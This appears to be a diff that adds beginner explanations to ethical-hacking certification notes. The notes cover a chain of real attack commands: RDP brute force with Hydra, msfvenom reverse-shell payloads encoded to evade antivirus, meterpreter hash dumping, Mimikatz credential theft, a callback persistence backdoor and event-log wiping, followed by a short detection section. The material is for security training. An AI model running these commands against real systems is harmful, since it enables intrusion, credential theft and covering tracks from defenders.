@@ -50,6 +50,8 @@ A **Remote Access Trojan (RAT)** is malware that gives an attacker complete remo
 
 ### Attack Chain
 
+> **In plain English:** This is the life cycle of a break-in — get in, stay in, talk to home base, run commands, steal data.
+
 ```
 Phase 1: Initial Access
 └─ Attacker delivers payload (email, website, exploit)
@@ -77,10 +79,10 @@ Phase 5: Data Exfiltration
 ## 2.2 RDP Cracking
 
 ### What It Does
-Uses Hydra to crack Windows RDP credentials via brute force.
+Uses Hydra to guess Windows Remote Desktop (RDP) logins by trying password after password until one works (brute force) — like trying every key on a ring until the door opens.
 
 ```bash
-# Basic RDP crack
+# Basic RDP crack — try every password in rockyou.txt for user Administrator
 hydra -l Administrator -P rockyou.txt rdp://192.168.1.5
 
 # With specific username
@@ -104,8 +106,10 @@ hydra -l admin -P passwords.txt rdp://192.168.1.5 -v
 
 ### Hash Cracking
 
+A hash is a one-way scrambled version of a password. You can't "unscramble" it, so you guess passwords, hash each guess, and look for a match.
+
 ```bash
-# Identify hash type
+# Identify hash type — tells you which algorithm made it (so you pick the right mode)
 hashid hashvalue
 
 # Crack SHA1
@@ -123,6 +127,8 @@ john hashes.txt --wordlist=rockyou.txt
 ## 2.4 SMB Exploitation
 
 ### Accessing Shares with Weak Credentials
+
+SMB (Server Message Block) is the Windows file-sharing protocol. If a shared folder has a weak login, `smbclient` lets you connect and browse it like an FTP drive.
 
 ```bash
 # Access share with username/password
@@ -145,6 +151,8 @@ mget *
 
 ### Msfvenom - Payload Generation
 
+A payload (the malicious file the victim runs) is built with `msfvenom`. When the victim opens it, it phones home to your machine (LHOST/LPORT) and hands you a remote shell.
+
 ```bash
 # Windows reverse shell (EXE)
 msfvenom -p windows/meterpreter/reverse_tcp \
@@ -164,10 +172,12 @@ msfvenom -p windows/meterpreter/reverse_tcp \
   LPORT=4444 \
   -e x86/shikata_ga_nai \
   -i 5 \
-  -f exe > obfuscated.exe
+  -f exe > obfuscated.exe          # -e/-i scramble the file 5x to dodge basic antivirus
 ```
 
 ### Metasploit Handler
+
+The handler is the "listener" on your side that catches the connection when the victim runs your payload — set it up before delivering the file.
 
 ```bash
 msfconsole
@@ -198,8 +208,10 @@ msf> run
 
 ### Meterpreter Commands
 
+Meterpreter is the interactive shell you get on the victim after a successful exploit — these are the everyday commands you'll run inside it.
+
 ```
-meterpreter > getuid                    # Current user
+meterpreter > getuid                    # Show which account you're running as
 meterpreter > sysinfo                   # System info
 meterpreter > ps                        # List processes
 meterpreter > download file.txt /tmp/   # Download file
@@ -243,8 +255,10 @@ msf> run                                # Lists privesc exploits that fit
 ### Step 3 — Dump Password Hashes
 
 ```
-meterpreter > hashdump                  # Dump SAM (local NTLM hashes)
+meterpreter > hashdump                  # Copy out the SAM (Windows' local password database) as NTLM hashes
 ```
+
+The NTLM hash is the scrambled form of a Windows password. You can't read it directly — you crack it in Step 5.
 
 **Output format** (`user:RID:LMhash:NTLMhash:::`):
 ```
@@ -256,6 +270,8 @@ The 4th field is the **NTLM hash** — that's what you crack.
 
 ### Step 4 — Grab Plaintext Credentials (Mimikatz / Kiwi)
 
+Where Step 3 gives you scrambled hashes, Kiwi (the Meterpreter version of Mimikatz) can pull readable passwords straight out of Windows memory — no cracking needed.
+
 ```
 meterpreter > load kiwi                 # Load Mimikatz module
 meterpreter > creds_all                 # All cached creds
@@ -264,6 +280,8 @@ meterpreter > lsa_dump_secrets          # LSA secrets
 ```
 
 ### Step 5 — Crack the NTLM Hash
+
+Feed the NTLM hashes from Step 3 to a cracker. It hashes each word in the wordlist and stops when one matches — revealing the plaintext password.
 
 ```bash
 # NTLM = hashcat mode 1000
@@ -275,6 +293,8 @@ john --format=NT ntlm_hashes.txt --wordlist=rockyou.txt
 
 ### Step 6 — Persistence (optional)
 
+Persistence plants a backdoor that reconnects automatically, so you keep access even after the victim reboots.
+
 ```
 meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.1.100
 ```
@@ -282,8 +302,10 @@ meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.1.100
 
 ### Step 7 — Clear Tracks (optional)
 
+Clearing logs erases the evidence of your activity so defenders can't see what you did.
+
 ```
-meterpreter > clearev                   # Clear Windows event logs
+meterpreter > clearev                   # Wipe Windows event logs (Application, System, Security)
 ```
 
 > **CEH core path in one line:** `getuid → getsystem → hashdump → crack (hashcat -m 1000) → loot`.
@@ -293,6 +315,8 @@ meterpreter > clearev                   # Clear Windows event logs
 ## 2.7 Detecting RAT Activity
 
 ### In Network Traffic (Wireshark)
+
+This flips to the defender's view: how to spot a RAT by the odd traffic it leaves behind. The giveaway is a machine reaching *out* to a stranger and staying connected far too long.
 
 1. **Reverse Connection Pattern**
    - Victim IP → Unknown External IP on non-standard port
